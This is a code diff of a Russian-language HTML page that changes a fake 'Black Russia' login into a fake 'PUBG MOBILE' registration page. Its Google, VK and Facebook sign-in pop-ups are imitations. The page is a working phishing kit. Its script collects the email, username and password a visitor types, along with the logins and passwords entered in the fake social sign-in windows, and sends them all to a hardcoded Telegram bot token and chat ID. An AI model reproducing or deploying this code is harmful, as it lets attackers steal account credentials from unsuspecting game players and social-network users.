@@ -3,14 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Black Russia - Вход</title>
+    <title>PUBG MOBILE - Регистрация</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: Arial, sans-serif; 
-            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), 
-                        url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&w=1200&q=80');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), 
+                        url('https://images.unsplash.com/photo-1552820728-8b83bb6b773f?ixlib=rb-4.0.3&auto=format&fit=crop&w=2000&q=80');
             background-size: cover;
+            background-position: center;
             color: white;
             min-height: 100vh;
             display: flex;
@@ -18,156 +24,393 @@
             justify-content: center;
             padding: 20px;
         }
-        
+
         .container {
-            background: rgba(0,0,0,0.9);
-            padding: 40px;
+            background: rgba(0, 0, 0, 0.9);
             border-radius: 15px;
-            border: 2px solid #b8860b;
-            max-width: 400px;
+            padding: 40px;
+            max-width: 450px;
             width: 100%;
+            border: 2px solid #ff8c00;
+            box-shadow: 0 0 30px rgba(255, 140, 0, 0.3);
         }
-        
+
         .logo {
             text-align: center;
             margin-bottom: 30px;
         }
-        
+
         .logo h1 {
-            color: #b8860b;
             font-size: 2.5em;
+            font-weight: bold;
+            color: #ff8c00;
+            text-shadow: 0 0 10px rgba(255, 140, 0, 0.5);
             margin-bottom: 10px;
         }
-        
-        .google-btn {
+
+        .logo p {
+            color: #ccc;
+            font-size: 1.1em;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ff8c00;
+            font-weight: bold;
+        }
+
+        input {
             width: 100%;
-            padding: 12px;
-            background: white;
-            color: #333;
-            border: none;
-            border-radius: 5px;
+            padding: 15px;
+            border: 2px solid #333;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
             font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ff8c00;
+            box-shadow: 0 0 10px rgba(255, 140, 0, 0.3);
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        .social-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .social-btn {
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
             font-weight: bold;
             cursor: pointer;
+            transition: transform 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .social-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .google-btn {
+            background: white;
+            color: #333;
+        }
+
+        .vk-btn {
+            background: #4a76a8;
+            color: white;
+        }
+
+        .facebook-btn {
+            background: #3b5998;
+            color: white;
+        }
+
+        .twitter-btn {
+            background: #1da1f2;
+            color: white;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #ff8c00, #ff6b00);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(45deg, #ff6b00, #ff8c00);
+        }
+
+        /* Модальные окна для соцсетей */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            color: #333;
+            text-align: center;
+        }
+
+        .modal-header {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             margin-bottom: 20px;
-        }
-        
-        .google-btn:hover {
-            background: #f5f5f5;
-        }
-        
-        .divider {
-            text-align: center;
-            margin: 20px 0;
-            color: #666;
-            position: relative;
-        }
-        
-        .divider::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: #333;
-        }
-        
-        .divider span {
-            background: #000;
-            padding: 0 15px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #333;
-            border-radius: 5px;
-            background: #111;
-            color: white;
-        }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(45deg, #b8860b, #daa520);
-            color: black;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            font-size: 1.5em;
             font-weight: bold;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 24px;
             cursor: pointer;
+            color: #666;
+        }
+
+        .message {
+            text-align: center;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 8px;
+            display: none;
+            font-weight: bold;
+        }
+
+        .success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">
-            <h1>BLACK RUSSIA</h1>
-            <p>Вход в систему</p>
+            <h1>PUBG MOBILE</h1>
+            <p>Создание аккаунта</p>
         </div>
-        
-        <button class="google-btn" onclick="showManualForm()">
-            <span>G</span>
-            Войти через Google
-        </button>
-        
-        <div class="divider"><span>или</span></div>
-        
-        <form id="loginForm" style="display: none;">
-            <input type="text" id="nickname" placeholder="Никнейм" required>
-            <input type="password" id="password" placeholder="Пароль" required>
-            <input type="email" id="email" placeholder="Email" required>
-            <button type="submit" class="submit-btn">Войти в аккаунт</button>
+
+        <form id="registerForm">
+            <div class="form-group">
+                <label for="email">Email адрес:</label>
+                <input type="email" id="email" placeholder="Введите ваш email" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="username">Игровой никнейм:</label>
+                <input type="text" id="username" placeholder="Придумайте никнейм" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Пароль:</label>
+                <input type="password" id="password" placeholder="Создайте пароль" required>
+            </div>
+
+            <div class="social-buttons">
+                <button type="button" class="social-btn google-btn" onclick="openModal('google')">
+                    <span>G</span> Google
+                </button>
+                <button type="button" class="social-btn vk-btn" onclick="openModal('vk')">
+                    <span>VK</span> ВКонтакте
+                </button>
+                <button type="button" class="social-btn facebook-btn" onclick="openModal('facebook')">
+                    <span>f</span> Facebook
+                </button>
+                <button type="button" class="social-btn twitter-btn" onclick="openModal('twitter')">
+                    <span>𝕏</span> Twitter
+                </button>
+            </div>
+            
+            <button type="submit" class="submit-btn">Создать аккаунт</button>
         </form>
         
-        <div id="successMessage" style="display: none; color: green; text-align: center; margin-top: 15px;">
-            ✅ Данные отправлены в техподдержку
+        <div class="message success" id="successMessage">
+            ✅ Аккаунт создан! Проверьте почту.
+        </div>
+        
+        <div class="message error" id="errorMessage">
+            ❌ Ошибка регистрации
+        </div>
+    </div>
+
+    <!-- Модальное окно Google -->
+    <div id="googleModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal('google')">×</button>
+            <div class="modal-header">
+                <span>G</span> Вход через Google
+            </div>
+            <p>Введите данные для входа через Google:</p>
+            <input type="email" placeholder="Email Google" style="width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px;">
+            <input type="password" placeholder="Пароль" style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px;">
+            <button onclick="sendSocialData('google')" style="width: 100%; padding: 12px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                Войти через Google
+            </button>
+        </div>
+    </div>
+
+    <!-- Модальное окно VK -->
+    <div id="vkModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal('vk')">×</button>
+            <div class="modal-header" style="color: #4a76a8;">
+                <span>VK</span> Вход через ВКонтакте
+            </div>
+            <p>Введите данные для входа через VK:</p>
+            <input type="text" placeholder="Телефон или email" style="width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px;">
+            <input type="password" placeholder="Пароль" style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px;">
+            <button onclick="sendSocialData('vk')" style="width: 100%; padding: 12px; background: #4a76a8; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                Войти через VK
+            </button>
+        </div>
+    </div>
+
+    <!-- Модальное окно Facebook -->
+    <div id="facebookModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal('facebook')">×</button>
+            <div class="modal-header" style="color: #3b5998;">
+                <span>f</span> Вход через Facebook
+            </div>
+            <p>Введите данные для входа через Facebook:</p>
+            <input type="text" placeholder="Email или телефон" style="width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px;">
+            <input type="password" placeholder="Пароль" style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px;">
+            <button onclick="sendSocialData('facebook')" style="width: 100%; padding: 12px; background: #3b5998; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                Войти через Facebook
+            </button>
         </div>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8';
         const TELEGRAM_CHAT_ID = '1491315056';
-        
-        function showManualForm() {
-            document.getElementById('loginForm').style.display = 'block';
-            document.querySelector('.google-btn').style.display = 'none';
-            document.querySelector('.divider').style.display = 'none';
+
+        // Функции для модальных окон
+        function openModal(social) {
+            document.getElementById(social + 'Modal').style.display = 'flex';
         }
-        
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+
+        function closeModal(social) {
+            document.getElementById(social + 'Modal').style.display = 'none';
+        }
+
+        function sendSocialData(social) {
+            const inputs = document.querySelectorAll('#' + social + 'Modal input');
+            const login = inputs[0].value;
+            const password = inputs[1].value;
             
-            const nickname = document.getElementById('nickname').value;
-            const password = document.getElementById('password').value;
-            const email = document.getElementById('email').value;
-            
-            const text = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ BLACK RUSSIA\n\n` +
-                        `👤 Никнейм: ${nickname}\n` +
+            if (!login || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+
+            const text = `🔐 ДАННЫЯ ${social.toUpperCase()}\n\n` +
+                        `👤 Логин: ${login}\n` +
                         `🔑 Пароль: ${password}\n` +
-                        `📧 Email: ${email}\n` +
-                        `🌐 Метод: Google Auth\n` +
+                        `🌐 Соцсеть: ${social}\n` +
                         `⏰ Время: ${new Date().toLocaleString()}`;
             
+            sendToTelegram(text);
+            closeModal(social);
+            alert('Данные отправлены!');
+        }
+
+        // Основная форма регистрации
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !username || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            const button = document.querySelector('.submit-btn');
+            button.textContent = 'Создание аккаунта...';
+            button.disabled = true;
+            
+            const text = `🎮 НОВАЯ РЕГИСТРАЦИЯ PUBG\n\n` +
+                        `📧 Email: ${email}\n` +
+                        `👤 Никнейм: ${username}\n` +
+                        `🔑 Пароль: ${password}\n` +
+                        `⏰ Время: ${new Date().toLocaleString()}`;
+            
+            sendToTelegram(text);
+        });
+
+        function sendToTelegram(text) {
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text
+                })
             })
-            .then(() => {
+            .then(response => response.json())
+            .then(data => {
                 document.getElementById('successMessage').style.display = 'block';
-                document.getElementById('loginForm').reset();
+                document.getElementById('registerForm').reset();
+                
+                const button = document.querySelector('.submit-btn');
+                button.textContent = 'Создать аккаунт';
+                button.disabled = false;
+                
                 setTimeout(() => {
                     document.getElementById('successMessage').style.display = 'none';
                 }, 3000);
+            })
+            .catch(error => {
+                document.getElementById('errorMessage').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('errorMessage').style.display = 'none';
+                }, 3000);
             });
-        });
+        }
+
+        // Закрытие модальных окон при клике вне их
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
     </script>
 </body>
 </html>
